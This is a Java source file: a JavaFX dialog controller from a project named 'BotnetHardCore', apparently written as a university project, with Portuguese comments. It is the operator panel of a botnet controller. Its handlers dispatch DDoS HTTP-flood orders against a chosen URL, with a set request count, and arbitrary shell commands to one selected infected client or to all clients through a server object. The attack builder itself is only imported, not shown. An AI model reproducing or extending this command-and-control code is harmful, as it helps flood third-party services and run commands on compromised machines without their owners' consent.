package br.com.controller;

import br.com.core.Server;
import br.com.model.ClientTableRow;
import compton.AttackBuilder;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Label;
import javafx.scene.control.Slider;
import javafx.scene.control.TextField;
import javafx.stage.Stage;
import model.GenericMessage;

/**
 * Project: BotnetHardCore
 * User: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 24/07/2018
 * Time: 10:55
 */
public class ClientAttackDialogController {

    @FXML
    private Label clientName;
    @FXML
    private TextField TFUrl;
    @FXML
    private TextField TFCmd;
    @FXML
    private Slider sliderRequisitionQuantity;

    private Stage mDialogStage;
    private ClientTableRow mClient;
    private Server mServer;
    private boolean okClicked = false;

    /**
     * Inicializa a classe controle. Este método é chamado automaticamente
     * apos o arquivo fxml ter sido carregado.
     */
    @FXML
    private void initialize() {
//        try {
//            mServer = new Server();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
    }

    /**
     * Define o palco deste dialog
     *
     * @param dialogStage
     */
    public void setmDialogStage(Stage dialogStage) {
        this.mDialogStage = dialogStage;
    }

    /**
     * Define o cliente a ser atacado no dialog
     *
     * @param client
     */
    public void setClient(ClientTableRow client) {
        this.mClient = client;
        if (mClient != null)
            clientName.setText(mClient.getName() + "/" + mClient.getIpAddress());
        else
            clientName.setText("Todos");
    }

    /**
     * Retorna true seo usuario clicar OK, caso contrario false.
     *
     * @return
     */
    public boolean isOkClicked() {
        return okClicked;
    }

    @FXML
    private void handleDDOSAttack() {
        if (isInputValidDDOS()) {
            okClicked = true;
            GenericMessage genericMessage = AttackBuilder.buildDDOSAttack()
                    .withUrl(TFUrl.getText())
                    .withQuantity((int) sliderRequisitionQuantity.getValue())
                    .clientShouldSendResponse(mClient != null)
                    .buildHTTP();
            mServer.send(genericMessage, mClient);
        }
    }

    @FXML
    private void handleCMD() {
        if (isInputValidCMD()) {
            okClicked = true;

            GenericMessage cmd = AttackBuilder.buildCommandLineExecuter()
                    .withCommand(TFCmd.getText())
                    .clientShouldSendResponse(mClient != null)
                    .build();

            mServer.send(cmd, mClient);
        }
    }

    /**
     * Quando o usuario clica Cancel.
     */
    @FXML
    private void handleCancel() {
        mDialogStage.close();
    }

    /**
     * Valida a entrada do usuario nos campos de texto.
     *
     * @return true se a entrada é valida
     */
    private boolean isInputValidDDOS() {
        String errorMessage = "";

        if (TFUrl.getText() == null || TFUrl.getText().length() == 0) {
            errorMessage += "Url inválida!\n";
        }

        if (errorMessage.length() == 0) {
            return true;
        } else {
            //Mostra a mesnagem de erro.
            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("Campos inválidos");
            alert.setHeaderText("Favor corrigir os campos inválidos");
            alert.setContentText(errorMessage);
            alert.showAndWait();

            return false;
        }
    }

    private boolean isInputValidCMD() {
        String errorMessage = "";

        if (TFCmd.getText() == null || TFCmd.getText().length() == 0) {
            errorMessage += "Url inválida!\n";
        }

        if (errorMessage.length() == 0) {
            return true;
        } else {
            //Mostra a mesnagem de erro.
            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("Campos inválidos");
            alert.setHeaderText("Favor corrigir os campos inválidos");
            alert.setContentText(errorMessage);
            alert.showAndWait();

            return false;
        }
    }

    public void setServer(Server server) {
        this.mServer = server;
    }
}
